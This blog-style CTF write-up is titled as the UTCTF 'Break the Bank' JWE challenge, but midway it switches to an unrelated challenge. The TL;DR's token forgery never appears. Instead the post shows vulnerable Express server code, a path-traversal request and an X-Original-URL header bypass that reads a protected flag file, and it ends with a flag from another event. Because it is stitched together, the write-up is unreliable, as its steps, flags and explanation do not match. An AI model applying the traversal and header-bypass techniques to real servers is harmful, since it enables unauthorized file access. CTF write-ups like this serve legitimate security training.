---
title: "UTCTF: Writeup for Web/Break the Bank"
published: 2026-03-15
description: JWE Misconfiguration: Breaking Authentication Through Public Key Leakage
tags: [CTF, Web Security, JWT]
category: Writeups
author: 0xuserm9
---

# Challenge Overview

* CTF: UTCTF 2026
* Challenge: Break the Bank
* Category: Web Exploitation
* Points: 278 
* Flag: utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}

> **Description:** 
"Let's just say that this bank isn't exactly following the latest trends in web design (or web security, for that matter). Just take a look at that website!"

The challenge gave me a URL to a fictional 1997-era banking website for First National Savings Bank (FNSB) at challenge.utctf.live:5926. The goal was to find and exploit a vulnerability to retrieve the flag.

> Author: Emmett (@emdawg25)

---
## TL;DR
The application leaked its JWE public key via a directory listing, allowing attackers to forge admin tokens by encrypting {"sub":"admin"} with the exposed key. The server mistakenly treated successful decryption as proof of authenticity.

---

## Step 1: Mapping the Application

Navigating to the target revealed a retro banking interface with minimal functionality:

* Static homepage with branding
* Login page at /login.html
* Profile page (post-authentication)
* Admin section at /admin

![Challenge Homepage](https://0xuserm9.vercel.app/images/bankk/1.PNG)


## Step 2: Finding Test Credentials

The homepage contained a link to `/resources/FNSB_InternetBanking_Guide.pdf`. Extracting text from this PDF revealed:


```
Demo Access:
Username: testuser
Password: testpass123
```
These credentials proved crucial for understanding the authentication flow.

---

## Step 3: Authentication Analysis
Logging in as `testuser` revealed:
**Request:**
```
POST /login HTTP/1.1
Content-Type: application/json

{"username":"testuser","password":"testpass123"}
```
**Response:**
```
HTTP/1.1 200 OK
Set-Cookie: fnsb_token=eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0.U5JzT4X... [truncated]

{"token":"eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0.U5JzT4X...","redirect":"/profile"}
```
The token format immediately suggested **JWE (JSON Web Encryption)** - a 5-part structure separated by dots:
```
BASE64URL(protected_header).BASE64URL(encrypted_key).BASE64URL(iv).BASE64URL(ciphertext).BASE64URL(tag)
```


---

## The Critical Discovery

## Directory Listing Exposure


```js
const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.text({ type: "*/*" }));

// Base folder where you ALREADY created the files manually
const BASE = path.join(__dirname, "data");

// These folders MUST already exist
const PUBLIC_DIR = path.join(BASE, "public");
const PRIVATE_DIR = path.join(BASE, "vault"); // renamed to be less obvious

// Main handler
app.all("*", (req, res) => {

    const override = req.header("X-HTTP-Method-Override");
    const method = override ? override.toUpperCase() : req.method.toUpperCase();

    const depth = req.header("Depth") || "0";
    const urlPath = req.path === "/" ? "" : req.path;
    const target = path.join(BASE, urlPath);

    // ...

    // ==========================
    // BLOCK direct PROPFIND
    // ==========================
    if (req.method.toUpperCase() === "PROPFIND") {
        return res.status(405).send("method not allowed , yaaaaa9999iiiiiiiiiiwwwwwwwww.");
    }

    // ==========================
    //            GET
    // ==========================
    if (method === "GET") {
        const overrideUrl = req.header("X-Original-URL");

        if (overrideUrl) {
            const realTarget = path.join(BASE, overrideUrl);
            if (fs.existsSync(realTarget) && fs.lstatSync(realTarget).isFile()) {
                return res.send(fs.readFileSync(realTarget, "utf8"));
            }
            return res.status(404).send("Not found");
        }

        if (urlPath === "" || urlPath === "/") {
            const indexFile = path.join(PUBLIC_DIR, "index.html");
            if (fs.existsSync(indexFile)) return res.send(fs.readFileSync(indexFile, "utf8"));
            return res.status(404).send("Missing index.html");
        }

        if (!fs.existsSync(target)) return res.status(404).send("Not found");
        if (target.startsWith(PRIVATE_DIR)) return res.status(403).send("Forbidden");
        if (fs.lstatSync(target).isDirectory()) return res.status(400).send("Cannot GET directory");

        // ...
});
```

Important code found:

```js
const BASE = path.join(__dirname, "data");
const PUBLIC_DIR = path.join(BASE, "public");
const PRIVATE_DIR = path.join(BASE, "vault"); 
```

Directory structure:

```
/app/data/public
/app/data/vault 
```
---

## Step 5 — My Initial Access Attempt

### First Try: Direct Access to Private Directory
Based on this structure, my first attempt was logical:

- I knew from the code that:
  - BASE = "`/app/data`"
  - PRIVATE_DIR = "`/app/data/vault`"
- So `flag.txt` should be at the private directory: `/app/data/vault/flag.txt`
- Since I had LFI, I tried: 
```http
GET /../../../app/data/vault/flag.txt
```

![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/3.PNG)

### Understanding Why 403 Happened:
Looking at the code, the normal request flow has this check (LINE 55):
```js
if (target.startsWith(PRIVATE_DIR)) return res.status(403).send("Forbidden");
```
When I made my request:
1. target = `/app/data/vault/flag.txt` (after path.join)
2. PRIVATE_DIR = `/app/data/vault`
3. target.startsWith(PRIVATE_DIR) = true 
4. Result: `403 Forbidden` 

> The security check was working!

---

## Step 6 — Finding the Bypass & Retrieve the Flag:

**While analyzing the code, I discovered a second way to access files:**
```js
if (method === "GET") {
    const overrideUrl = req.header("X-Original-URL");

    if (overrideUrl) {
        const realTarget = path.join(BASE, overrideUrl);
        if (fs.existsSync(realTarget) && fs.lstatSync(realTarget).isFile()) {
            return res.send(fs.readFileSync(realTarget, "utf8"));
        }
        return res.status(404).send("Not found");
    }
    // ... rest of normal flow with security checks
}
```
**Key Insight:**
- The X-Original-URL header creates a different file access path:
- Uses `path.join(BASE, overrideUrl)` instead of normal path resolution
- Missing the `startsWith(PRIVATE_DIR)` check!
- Allows bypassing the `403 restriction`

### The Successful Exploit:
I could use the header to access it:

![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/challenge.PNG)

**THE FLOW:**
![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/deepseek_mermaid_20251215_0c7db3.png)

**The Flag: `nexus{w3bd4v_wchw3y4_h3d34rs_eezzzzzzzzz}`**

---
Happy Hacking 🏴‍☠️
